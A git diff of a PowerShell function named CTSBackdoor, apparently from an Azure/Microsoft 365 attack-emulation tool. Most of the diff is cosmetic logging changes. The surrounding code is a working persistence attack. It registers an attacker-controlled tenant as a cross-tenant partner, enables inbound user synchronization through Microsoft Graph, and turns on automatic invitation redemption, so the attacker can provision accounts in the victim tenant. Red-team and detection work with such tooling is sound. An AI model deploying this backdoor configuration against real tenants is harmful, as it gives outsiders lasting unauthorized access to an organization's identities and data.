@@ -8,18 +8,19 @@ function CTSBackdoor {
     mitre_details("CTSBackdoor")
 
     $tenants = Get-AzTenant
-    Write-Host "Available tenants:`n"
+    MAADWriteProcess "Available tenants:"
     foreach ($tenant in $tenants){
-        Write-Host "$($tenant.Name) : $($tenant.Id)"
+        MAADWriteProcess "$($tenant.Name) : $($tenant.Id)"
     }
-    Write-Host "`n"
+    MAADWriteProcess ""
 
     #Enter details for source tenant (attacker controlled tenant)
-    $ExternalTenantId = Read-Host -Prompt "`nEnter the tenant ID of your tenant (backdoor tenant)"
+    $ExternalTenantId = Read-Host -Prompt "`n[?] Enter tenant ID of external tenant (backdoor tenant)"
+    Write-Host ""
 
     if ($null -eq $ExternalTenantId) {
-        Write-Host "[Input Error] ExternalTenantId cannot be null." -ForegroundColor Red
-        Write-Host "`nExiting backdoor module now" -ForegroundColor Gray
+        MAADWriteError "ExternalTenantId cannot be null"
+        MAADWriteProcess "Exiting backdoor module now"
         break
     }
 
@@ -30,11 +31,10 @@ function CTSBackdoor {
 
     try {
         New-MgPolicyCrossTenantAccessPolicyPartner -BodyParameter $Param1 | Format-List
-        Write-Host "`n1/3 : Added source(backdoor) tenant to target tenant" -ForegroundColor Gray
+        MAADWriteProcess "1/3 -> Added source(backdoor) tenant to target tenant"
     }
     catch {
-        Write-Host "`n[Error] 1/3 Failed to add source tenant to target tenant" -ForegroundColor Red
-        #break
+        MAADWriteError "1/3 Failed to add source tenant to target tenant"
     }
     
     #Enabling user synchronization in the target tenant
@@ -46,10 +46,10 @@ function CTSBackdoor {
 
     try {
         Invoke-MgGraphRequest -Method PUT -Uri "https://graph.microsoft.com/v1.0/policies/crossTenantAccessPolicy/partners/$ExternalTenantId/identitySynchronization" -Body $Param2
-        Write-Host "`n2/3: Enabled user synchronization in target tenant" -ForegroundColor Gray
+        MAADWriteProcess "2/3 -> Enabled user synchronization in target tenant"
     }
     catch {
-        Write-Host "`n[Error] 2/3 Failed to enable user synchronization in target tenant" -ForegroundColor Red
+        MAADWriteError "2/3 Failed to enable user synchronization in target tenant"
     }
     
     #Verify config deployed successfully to proceed to next step
@@ -59,11 +59,11 @@ function CTSBackdoor {
             "InboundAllowed"="True"
         }
         Update-MgPolicyCrossTenantAccessPolicyPartner -CrossTenantAccessPolicyConfigurationPartnerTenantId $ExternalTenantId -AutomaticUserConsentSettings $AutomaticUserConsentSettings
-        Write-Host "`n3/3: Setup automatic invitation redemption in target tenant" -ForegroundColor Gray
-        Write-Host "`n[Success] Deployed backdoor config in target tenant" -ForegroundColor Yellow
-        Write-Host "`nTo establish backdoor access - deploy cross tenant synchronization in source tenant and provision users in this target tenant" -ForegroundColor Gray
+        MAADWriteProcess "3/3 -> Setup automatic invitation redemption in target tenant"
+        MAADWriteInfo "To establish backdoor access - Deploy CTS in source tenant & provision users in this target tenant"
+        MAADWriteSuccess "Backdoor Config Deployed in Target Tenant"
     }
     else {
-        Write-Host "`n[Error] 3/3 Failed to deploy config" -ForegroundColor Red
+        MAADWriteError "3/3 Failed to deploy config"
     }
 }
